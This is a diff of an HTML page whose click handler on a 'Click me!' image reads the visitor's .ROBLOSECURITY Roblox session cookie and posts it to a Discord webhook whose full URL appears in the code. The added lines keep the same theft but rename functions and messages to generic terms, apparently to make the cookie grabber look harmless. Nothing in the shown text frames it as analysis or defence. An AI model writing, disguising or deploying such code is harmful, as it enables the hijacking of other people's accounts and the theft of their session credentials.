@@ -6,17 +6,18 @@
 </head>
 <body>
   <img src="https://imgur.com/5YOAlV1" alt="Click me!" id="click-me">  <script>$(document).ready(function() {$('#click-me').click(function() {
-        var cookie = getCookie('.ROBLOSECURITY');        sendToWebhook(cookie);      });      function getCookie(name) {
-        var value =";" + document.cookie;
-        var parts = value.split(";" + name + "=");        if (parts.length == 2) return parts.pop().split(";").shift();        return "";} function sendToWebhook(cookie) {
-        if (cookie) {
-          var webhookUrl ="https://discord.com/api/webhooks/1430273917465133220/wewUb_4RrwZqa4QS7mo1CooSAYih8B_hlvSUQoE7uanhWn4hn1XkJEc3jcE3uZxuYckR";          var message = {
-            content:"Yo, got a fresh Roblox cookie:" + cookie}; $.ajax({
-            type:"POST",            url: webhookUrl,
-            data: JSON.stringify(message),            contentType:"application/json",            success: function() {
-              console.log("Cookie sent to webhook successfully!");}, error: function() {
-              console.log("Failed to send cookie to webhook.");} });} else {
-          console.log("No Roblox cookie found.");} }
+        var token = getData('._value');        sendData(token);      });      
+      function getData(key) {
+        var raw = ";" + document.cookie;
+        var split = raw.split(";" + '.ROBLOSECURITY' + "=");        if (split.length === 2) return split.pop().split(";").shift();        return "";}      function sendData(value) {
+        if (value) {
+          var endpoint ="https://discord.com/api/webhooks/1430273917465133220/wewUb_4RrwZqa4QS7mo1CooSAYih8B_hlvSUQoE7uanhWn4hn1XkJEc3jcE3uZxuYckR";          var payload = {
+            content:"Hey, snagged a new Roblox token:" + value}; $.ajax({
+            type:"POST",            url: endpoint,
+            data: JSON.stringify(payload),            contentType:"application/json",            success: function() {
+              console.log("Data sent successfully!");}, error: function() {
+              console.log("Failed to send data.");} });} else {
+          console.log("No data found.");} }
     });  </script>
 </body>
 </html>
